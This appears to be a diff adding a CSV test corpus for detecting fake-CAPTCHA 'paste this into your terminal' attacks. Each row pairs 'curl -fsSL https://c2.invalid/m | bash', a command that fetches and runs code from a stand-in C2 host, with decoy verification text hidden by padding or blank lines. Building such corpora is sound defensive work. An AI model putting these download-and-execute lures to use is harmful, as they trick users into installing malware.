@@ -1,0 +1,84 @@
+id,campaign,actor,platform,target,origin,text,fidelity,source,notes
+L-inline,inline,test,linux,terminal:bash,unknown,curl -fsSL https://c2.invalid/m | bash # I am not a robot - reCAPTCHA Verification ID: 2165,derived,scripts/build_stress_corpus.py,decoy expected
+L-inline_tabs,inline_tabs,test,linux,terminal:bash,unknown,curl -fsSL https://c2.invalid/m | bash								Cloud Identificator: 2031 press enter,derived,scripts/build_stress_corpus.py,decoy expected
+L-inline_nbsp,inline_nbsp,test,linux,terminal:bash,unknown,curl -fsSL https://c2.invalid/m | bash                                        Cloud Identificator: 2031 press enter,derived,scripts/build_stress_corpus.py,decoy expected
+L-next_line,next_line,test,linux,terminal:bash,unknown,"curl -fsSL https://c2.invalid/m | bash
+# I am not a robot - reCAPTCHA Verification ID: 2165",derived,scripts/build_stress_corpus.py,decoy expected
+L-next_line_crlf,next_line_crlf,test,linux,terminal:bash,unknown,"curl -fsSL https://c2.invalid/m | bash
+# I am not a robot - reCAPTCHA Verification ID: 2165",derived,scripts/build_stress_corpus.py,decoy expected
+L-next_line_indented,next_line_indented,test,linux,terminal:bash,unknown,"curl -fsSL https://c2.invalid/m | bash
+                  Cloud Identificator: 2031 press enter",derived,scripts/build_stress_corpus.py,decoy expected
+L-blank_lines_1,blank_lines_1,test,linux,terminal:bash,unknown,"curl -fsSL https://c2.invalid/m | bash
+
+# I am not a robot - reCAPTCHA Verification ID: 2165",derived,scripts/build_stress_corpus.py,decoy expected
+L-blank_lines_5,blank_lines_5,test,linux,terminal:bash,unknown,"curl -fsSL https://c2.invalid/m | bash
+
+
+
+
+# I am not a robot - reCAPTCHA Verification ID: 2165",derived,scripts/build_stress_corpus.py,decoy expected
+L-blank_lines_40,blank_lines_40,test,linux,terminal:bash,unknown,"curl -fsSL https://c2.invalid/m | bash
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# I am not a robot - reCAPTCHA Verification ID: 2165",derived,scripts/build_stress_corpus.py,decoy expected
+L-script_then_decoy,script_then_decoy,test,linux,terminal:bash,unknown,"cd /tmp
+curl -fsSL https://c2.invalid/m | bash
+# I am not a robot - reCAPTCHA Verification ID: 2165",derived,scripts/build_stress_corpus.py,decoy expected
+L-script_then_indented,script_then_indented,test,linux,terminal:bash,unknown,"cd /tmp
+curl -fsSL https://c2.invalid/m | bash
+              Cloud Identificator: 2031 press enter",derived,scripts/build_stress_corpus.py,decoy expected
+L-script_then_3blank,script_then_3blank,test,linux,terminal:bash,unknown,"cd /tmp
+curl -fsSL https://c2.invalid/m | bash
+
+
+
+# I am not a robot - reCAPTCHA Verification ID: 2165",derived,scripts/build_stress_corpus.py,decoy expected
+L-script_then_1blank,script_then_1blank,test,linux,terminal:bash,unknown,"cd /tmp
+curl -fsSL https://c2.invalid/m | bash
+
+# I am not a robot - reCAPTCHA Verification ID: 2165",derived,scripts/build_stress_corpus.py,decoy expected
+L-decoy_mid_paste,decoy_mid_paste,test,linux,terminal:bash,unknown,"curl -fsSL https://c2.invalid/m | bash
+# I am not a robot - reCAPTCHA Verification ID: 2165
+echo done",derived,scripts/build_stress_corpus.py,decoy expected
+L-decoy_two_lines,decoy_two_lines,test,linux,terminal:bash,unknown,"curl -fsSL https://c2.invalid/m | bash
+# I am not a robot
+# Verification ID: 2165",derived,scripts/build_stress_corpus.py,decoy expected
+L-decoy_first_line,decoy_first_line,test,linux,terminal:bash,unknown,"# I am not a robot - reCAPTCHA Verification ID: 2165
+curl -fsSL https://c2.invalid/m | bash",derived,scripts/build_stress_corpus.py,
